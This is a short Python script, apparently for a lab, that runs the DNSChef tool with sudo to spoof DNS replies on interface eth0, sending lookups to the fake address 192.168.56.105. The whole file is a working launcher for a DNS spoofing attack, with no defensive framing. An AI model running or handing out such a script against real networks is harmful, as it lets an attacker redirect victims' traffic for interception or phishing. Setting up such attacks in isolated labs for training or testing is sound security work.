#!/usr/bin/env python3
import subprocess
print("[+] Starting DNS Spoofing with DnsChef...")
subprocess.run(["sudo", "dnschef", "--fakeip", "192.168.56.105", "--interface", "eth0"])